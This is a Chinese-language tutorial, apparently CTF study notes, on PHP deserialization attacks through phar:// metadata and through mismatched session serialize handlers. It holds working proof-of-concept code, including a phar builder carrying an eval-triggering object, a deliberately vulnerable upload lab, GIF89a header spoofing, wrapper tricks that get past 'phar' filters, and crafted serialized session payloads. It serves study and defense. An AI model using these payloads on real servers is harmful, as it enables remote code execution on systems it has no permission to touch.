<h1 id="三、phar-序列化"><a href="#三、phar-序列化" class="headerlink" title="三、phar 序列化"></a>三、phar 序列化</h1><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p>
<p><a href="https://blog.csdn.net/qq975353472/article/details/109668373">https://blog.csdn.net/qq975353472/article/details/109668373</a></p>
<p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
<p>一般利用反序列化漏洞，一般都是借助unserialize()函数。</p>
<p><strong>新型攻击方式：利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</strong></p>
<ul>
<li>特点：不使用 <code>unserialize()函数</code></li>
</ul>
<p><strong>利用条件：</strong></p>
<ul>
<li>能够上传 <code>.phar</code> 文件至服务器</li>
<li>存在可用的 魔术方法 作为跳板</li>
<li>文件操作函数的参数可控</li>
<li><code>/  :   phar</code>  等特殊字符未被过滤</li>
</ul>
<p><strong>受影响函数列表：</strong></p>
<p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p>
<p>原理参考 <a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<h2 id="3-1-phar-介绍"><a href="#3-1-phar-介绍" class="headerlink" title="3.1 phar 介绍"></a>3.1 phar 介绍</h2><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，会以序列化的形式存储用户自定义的 <code>meta-data</code> ，当受影响的文件操作函数调用 phar 文件时，会自动反序列化 meta-data 中的内容。</p>
<p>在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。用来将多个PHP文件打包为一个文件.可以和tar zip相互转化。</p>
<ul>
<li>版本 &gt;5.2</li>
</ul>
<p><strong>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。</strong>内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 <strong>phar://就是一种内置的流包装器。</strong></p>
<p><strong>php中一些常见的流包装器如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h2 id="3-2-phar-文件结构"><a href="#3-2-phar-文件结构" class="headerlink" title="3.2 phar 文件结构"></a>3.2 phar 文件结构</h2><ul>
<li><p>a stub</p>
<p>phar 文件的标志，前面内容不限，必须以 __HALT_COMPILER();?&gt; 结尾，否则 phar 扩展将无法识别该文件是 phar文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>a manifest describing the contents</p>
<p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点。</p>
<p><img src="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png" alt="image-20210816144952619"></p>
</li>
<li><p>the file contents</p>
<p>所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写</p>
</li>
<li><p>a signature for verifying Phar integrity</p>
<p>签名格式，位于末尾</p>
<p><img src="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png" alt="image-20210816145202078"></p>
</li>
</ul>
<h2 id="3-3-测试：phar-文件的构造"><a href="#3-3-测试：phar-文件的构造" class="headerlink" title="3.3 测试：phar 文件的构造"></a>3.3 测试：phar 文件的构造</h2><ul>
<li><p>条件：php.ini</p>
<p><img src="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png" alt="image-20210816145304311"></p>
</li>
</ul>
<p><strong>编写 生成 .phar 文件</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;		</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">	<span class="variable">$o</span>-&gt;data = <span class="string">&#x27;hacker123!&#x27;</span>;</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	<span class="comment">//签名将自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问过后，会在当前目录下生成 <code>1.phar</code> 文件，打开，看其内容</p>
<p><img src="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png" alt="image-20210816150109626"></p>
<p><strong>发现，meta-data 是以序列化的形式存储的</strong></p>
<p><strong>那么，在哪里进行反序列化？</strong></p>
<p><strong>phar://协议读取文件</strong></p>
<ul>
<li><p>php 大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有</p>
<p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://1.phar&#x27;</span>);<span class="comment">//phar:// 触发：进行反序列化</span></span><br></pre></td></tr></table></figure>

<p>访问，成功触发了反序列化，得到 </p>
<p><img src="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png" alt="image-20210816150553492"></p>
<h2 id="3-4-常见利用：文件上传-文件包含"><a href="#3-4-常见利用：文件上传-文件包含" class="headerlink" title="3.4 常见利用：文件上传+文件包含"></a>3.4 常见利用：文件上传+文件包含</h2><p><strong>环境：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload_file.php <span class="comment"># 后端检测文件上传,确保文件类型及后缀是 .gif</span></span><br><span class="line">upload_file.html <span class="comment">#文件上传表单前端</span></span><br><span class="line">file_un.php  <span class="comment">#存在 file_exists() 以及  __destruct() 用以phar://伪协议读取文件内容</span></span><br></pre></td></tr></table></figure>

<p><strong>利用条件：</strong></p>
<ul>
<li>存在文件上传</li>
<li>存在 <code>file_exists()  fopen()  file_get_contents()  file()</code> 等文件操作函数</li>
<li><code>phar://</code> 等字符未被过滤</li>
</ul>
<p><strong>upload_file.php</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>upload_file.html</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/ctf/phar/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p><strong>file_un.php</strong>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlihgt_file(__FILE__);</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>

<p><strong>题目：</strong></p>
<p><img src="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png" alt="image-20210816151653686"></p>
<p><strong>生成 .phar 文件：</strong>phar.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlihgt_file(__FILE__);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hack.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> AnyClass();</span><br><span class="line">	<span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	<span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest	</span></span><br><span class="line">	<span class="comment">//签名2将自动计算</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>访问，得到 hack.phar</p>
<p><img src="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png" alt="image-20210816152258664"></p>
<p>将 hack.phar 后缀修改为 hack.gif</p>
<p>在 upload_file.html 里上传</p>
<p><img src="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png" alt="image-20210816152845318"></p>
<p><img src="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png" alt="image-20210816152858027"></p>
<p>然后我们进入 file_un.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?filename=phar://hack.gif</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png" alt="image-20210816153008894"></p>
<p>可以看到，命令成功执行</p>
<h2 id="3-5-绕过姿势：过滤-phar"><a href="#3-5-绕过姿势：过滤-phar" class="headerlink" title="3.5 绕过姿势：过滤 phar"></a>3.5 绕过姿势：过滤 phar</h2><ul>
<li>当题目环境限制 phar 不能出现在前面的字符里，即无法使用 <code>phar:// 协议</code>  ，可以使用 <code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li>
<li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;setStub(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-6-php-session-反序列化"><a href="#3-6-php-session-反序列化" class="headerlink" title="3.6 php-session 反序列化"></a>3.6 php-session 反序列化</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
<p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p>
<p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p>
<h3 id="3-6-1-关于-php-中的-session-存储机制"><a href="#3-6-1-关于-php-中的-session-存储机制" class="headerlink" title="3.6.1 关于 php 中的 session 存储机制"></a>3.6.1 关于 php 中的 session 存储机制</h3><p><strong>session 介绍：</strong></p>
<blockquote>
<p>在计算机中，尤其是在网络应用中，称为“<strong>会话控制</strong>”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，<strong>将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</strong>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
</blockquote>
<p><strong>php 中的 session 存储相关匹配值：</strong></p>
<p>PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment"># enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中</span></span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment"># cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空</span></span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">4. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"># name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span></span><br><span class="line"><span class="comment"># 重点：prefix+name将表示为session中的键名</span></span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">6. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line">7. session.use_strict_mode=off </span><br><span class="line"><span class="comment"># 表示我们对 Cookie 中的 session 是可控的</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. session.save_path=<span class="string">&quot;&quot;</span>	</span><br><span class="line"><span class="comment"># 设置 session 的储存路径</span></span><br><span class="line"></span><br><span class="line">2. session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></span><br><span class="line"></span><br><span class="line">3. session.auto_start</span><br><span class="line"><span class="comment"># boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span></span><br><span class="line"></span><br><span class="line">4. session.serialize_handler</span><br><span class="line"><span class="comment"># string --定义用来序列化/反序列化的处理器名字。默认使用php</span></span><br></pre></td></tr></table></figure>

<p>php 版本为 5.4.45 的部分默认配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">session.save_handler = files</span><br><span class="line">session.auto_start = 0</span><br><span class="line">session.serialize_handler = php</span><br></pre></td></tr></table></figure>

<p><code>session.serialize_handler = php</code> 该选项是用来设置 session 的 <code>序列化引擎</code> 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。</p>
<p><strong>其它存储引擎如下</strong>：</p>
<ul>
<li><strong>php_binary</strong>:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
<li><strong>php</strong>:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
<li><strong>php_serialize(php&gt;5.5.4)</strong>:存储方式是，经过serialize()函数序列化处理的值</li>
</ul>
<p>如果需要修改该引擎，须有手动添加代码 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br></pre></td></tr></table></figure>

<p>下面我们仅仅讨论 php 引擎所引起的 反序列化。</p>
<p><strong>php 中的 session 存储机制：</strong></p>
<p>php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 <code>session.save_handler</code> 来进行确定的，默认以文件的方式存储。所存储的文件名是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 session 值得序列化之后的内容。</p>
<p><img src="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png" alt="image-20210912093352903"></p>
<p>例如：客户端的用户进行抓包，在 <code>Cookie</code> 字段中进行设置 <code>PHPSESSION=test</code> ，则 服务器上就将会创建一个文件 <code>/tmp/sess_test</code> 文件，用于存储 用户的 SESSIONS 信息。</p>
<p>测试：PHP 7.3.4             </p>
<p><strong>php 默认引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png" alt="image-20210912100023408"></p>
<p>session 文件中其中，<code>name</code> 是键名，<code>s:4:&quot;test&quot;;</code> 是 <code>serialize(&quot;test&quot;)</code> 的结果。</p>
<p><strong>php_serialize 引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"> <span class="variable">$SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png" alt="image-20210912100614688"></p>
<p>session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 </p>
<p><code>a:1</code> 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。</p>
<p><strong>在php_binary引擎下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png" alt="image-20210912101016728"></p>
<p>session 文件内容是 names:4:”test”;</p>
<p>由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p>
<h3 id="3-6-2-php-session-序列化简单测试：利用原理"><a href="#3-6-2-php-session-序列化简单测试：利用原理" class="headerlink" title="3.6.2 php-session 序列化简单测试：利用原理"></a>3.6.2 php-session 序列化简单测试：利用原理</h3><p><strong>序列化简单测试：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">lover</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以传入：<code>?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125;</code></p>
<p>则将会在页面中输出 <code>spoock</code> 。</p>
<p><strong>php session 反序列化构造：</strong></p>
<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p>
<p>示例：</p>
<p>假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：<code>a=|o:4:&quot;test&quot;:0:&#123;&#125;</code></p>
<p>则 其通过 php_serialize 的引擎处理过后，将会变成 <code>a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125;</code></p>
<p>随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： <code>&#123;s:1:&quot;a&quot;;a:16:&quot;</code>  是键名，而 | 后面的就会被理解为一个对象的实例化注入。</p>
<p><strong>测试 ：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>访问 ?a=|o:4:”test”:0:{}</p>
<p>此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”}</p>
<p>设置 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> ，即使用 php 引擎读取，再次访问即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;a:16:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-6-3-php-session-序列化实际利用"><a href="#3-6-3-php-session-序列化实际利用" class="headerlink" title="3.6.3 php-session 序列化实际利用"></a>3.6.3 php-session 序列化实际利用</h3><p><strong>必备知识：</strong></p>
<ul>
<li><ul>
<li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p>
</li>
<li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p>
